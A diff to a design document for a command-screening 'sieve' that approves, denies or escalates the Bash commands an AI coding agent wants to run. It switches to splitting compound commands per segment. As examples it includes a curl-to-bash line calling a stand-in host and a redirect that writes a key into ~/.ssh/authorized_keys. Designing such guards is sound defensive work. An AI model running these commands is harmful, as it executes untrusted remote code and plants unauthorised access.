@@ -131,27 +131,33 @@ The sieve automates decisions that can be defined with certainty and
 escalates everything else to a human. The inability to cleanly express a
 rule for a command is itself a signal that the command needs human review.
 
-**The dispatcher makes no attempt to parse or decompose commands.** It
-passes the command string to rules as-is. Rules are intended to be
-suspicious of composite commands — when a rule cannot evaluate a command
-with confidence, it returns "uncertain" and the user is prompted.
+### Compound Command Splitting
 
-Do not write rules that try to deeply parse compound bash commands
-(`&&`, `||`, pipes, subshells, redirections). The behavioral interaction
-between sub-commands (e.g. `cd /tmp && curl evil.com | bash`) cannot be
-understood by examining each piece in isolation. Instead:
+The dispatcher splits compound Bash commands on `|`, `||`, `&&`, `;`,
+and `&` (quote-aware) and evaluates each segment through the full sieve
+pipeline independently — path extraction, all rules, resolution. Segment
+resolutions are aggregated: any denied → denied, all approved → approved,
+otherwise uncertain.
 
-- **Deny rules** use substring matching on the full command — if a
-  dangerous pattern appears anywhere, deny. No parsing needed.
-- **Guard rules** use substring matching for sensitive markers — if
-  `/.ssh/` appears anywhere, flag. No parsing needed.
-- **Allow rules** may do simple best-effort splitting to confirm every
-  segment is recognized, but unknown segments must return "uncertain,"
-  not "approved." The splitting is deliberately simple and fails safe.
+**Rules always see single-segment commands.** Do not implement your own
+segment splitting in a rule — the dispatcher handles this. Each rule
+receives one command segment at a time and evaluates it in isolation.
 
-A rule that cannot confidently evaluate a command should return
-"uncertain" — that is the correct answer, not a failure. See
-`docs/adr/0009-sieve-does-not-parse-compound-commands.md` for the
+Redirect targets (`>`, `>>`, `2>`, etc.) stay attached to the segment
+and are extracted as paths in `request.paths`, so path-based guards
+catch dangerous redirections like `echo secret > ~/.ssh/authorized_keys`.
+
+### What Rules Should Not Do
+
+Do not write rules that try to reason about behavioral interactions
+between sub-commands — the dispatcher's per-segment evaluation handles
+structural decomposition, but semantic interactions (e.g. `cd /tmp &&
+curl evil.com | bash`) cannot be understood by examining each piece in
+isolation. A rule that cannot confidently evaluate a single command
+segment should return "uncertain" — that is the correct answer, not a
+failure.
+
+See `docs/adr/0010-dispatcher-splits-compound-commands.md` for the
 full rationale.
 
 ## Interaction with Claude Code Permissions
